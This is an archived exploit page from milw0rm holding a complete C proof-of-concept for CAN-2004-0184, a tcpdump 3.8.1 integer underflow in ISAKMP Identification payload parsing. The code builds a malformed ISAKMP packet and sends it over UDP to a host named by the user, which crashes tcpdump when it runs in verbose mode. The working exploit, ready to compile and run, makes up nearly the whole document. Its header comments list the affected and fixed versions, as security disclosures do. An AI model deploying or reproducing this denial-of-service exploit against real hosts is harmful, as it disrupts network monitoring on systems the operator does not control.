<html><head><title>tcpdump ISAKMP Identification payload Integer Overflow Exploit</title></head><pre>/*
 * tcpdump packet sniffer
 * Integer underflow in ISAKMP Identification payload
 * denial of service vulnerability
 * proof of concept code
 * version 1.0 (Apr 02 2004)
 * CVE-ID: CAN-2004-0184
 *
 * by Remi Denis-Courmont &lt; exploit at simphalampin dot com &gt;
 *   www simphalempin com dev 
 * Remi Denis-Courmont is not responsible for the misuse of the
 * source code provided hereafter.
 * 
 * This vulnerability was found by:
 *   Rapid7, LLC Security Advisory - www rapid7 com
 * whose original advisory may be fetched from:
 *   www rapid7 com advisories R7-0017 html
 *
 * Vulnerable:
 *  - tcpdump 3.8.1
 *
 * Not vulnerable:
 *  - tcpdump 3.8.3
 *
 * NOTES:
 *   The vulnerability cannot be exploited to cause a denial of service
 * with the Debian's tcpdump packages as it was partly fixed as part of
 * the fix for earlier known CAN-2003-0108 vulnerability, though the bug
 * is still present. That may be the case for other vendors which were
 * not investigated.
 *
 *   tcpdump must be run with a verbosity level of at least 3:
 * # tcpdump -vvv
 * Otherwise, no denial of service will occur.
 */


#include &lt;string.h&gt;
#include &lt;stdio.h&gt;

#include &lt;sys/types.h&gt;
#include &lt;unistd.h&gt;
#include &lt;sys/socket.h&gt;

#include &lt;netdb.h&gt;

static const char packet[] =
	/* ISAKMP header */
	&quot;\x00\x00\x00\x00\x00\x00\x00\x00&quot; /* Initiator cookie */
	&quot;\x00\x00\x00\x00\x00\x00\x00\x00&quot; /* Responder cookie */
	&quot;\x05&quot;			/* Next payload: Identification */
	&quot;\x10&quot;			/* Version: 1.0 */
	&quot;\x01&quot;			/* Exchange type */
	&quot;\x00&quot;			/* Flags */
	&quot;\x00\x00\x00\x00&quot;	/* Message ID */
	&quot;\x00\x00\x00\x24&quot;	/* Length */
	
	/* ISAKMP Identification payload */
	&quot;\x00&quot;			/* Next payload: none */
	&quot;\x00&quot;			/* Reserved */
	&quot;\x00\x05&quot;		/* Payload length (incorrect) */
	&quot;\x20&quot;			/* ID type (unknown) */
	&quot;\x00\x00\x00&quot;		/* DOI */
;

static int
send_evil_packet (const struct addrinfo *r)
{
	int fd;
	size_t len;
		
	fd = socket (r-&gt;ai_family, r-&gt;ai_socktype, r-&gt;ai_protocol);
	if (fd == -1)
	{
		perror (&quot;Socket error&quot;);
		return 1;
	}

	len = sizeof (packet) - 1;
	if (sendto (fd, packet, len, 0, r-&gt;ai_addr, r-&gt;ai_addrlen) != len)
	{
		perror (&quot;Packet sending error&quot;);
		close (fd);
		return 1;
	}
	
	puts (&quot;Packet sent!&quot;);
	close (fd);
	return 0;
}


static int
proof (const char *hostname)
{
	struct addrinfo *res;
	int check;
	
	{
		struct addrinfo help;
		memset (&amp;help, 0, sizeof (help));
		help.ai_socktype = SOCK_DGRAM;
	
		check = getaddrinfo (hostname, &quot;isakmp&quot;, &amp;help, &amp;res);
	}
	
	if (check == 0)
	{
		struct addrinfo *ptr;

		for (ptr = res; ptr != NULL; ptr = ptr-&gt;ai_next)
			check |= send_evil_packet (ptr);

		freeaddrinfo (res);
		return check;
	}

	fprintf (stderr, &quot;%s: %s\n&quot;, hostname, gai_strerror (check));
	return -1;
}


static void
usage (const char *path)
{
	fprintf (stderr, &quot;Usage: %s &lt;hostname/IP&gt;\n&quot;, path);
}


int
main (int argc, char *argv[])
{
	puts (&quot;tcpdump Integer underflow in ISAKMP Identification payload\n&quot;
		&quot;proof of concept code\n&quot;
		&quot;Copyright (C) Remi Denis-Courmont 2004 &quot;
		&quot;&lt;\x65\x78\x70\x6c\x6f\x69\x74\x40\x73\x69\x6d\x70&quot;
		&quot;\x68\x61\x6c\x65\x6d\x70\x69\x6e\x2e\x63\x6f\x6d&gt;\n&quot;);
			
			
	if (argc != 2)
	{
		usage (argv[0]);
		return 2;
	}
		
	return proof (argv[1]) ? 1 : 0;
}

// milw0rm.com [2004-04-05]</pre></html>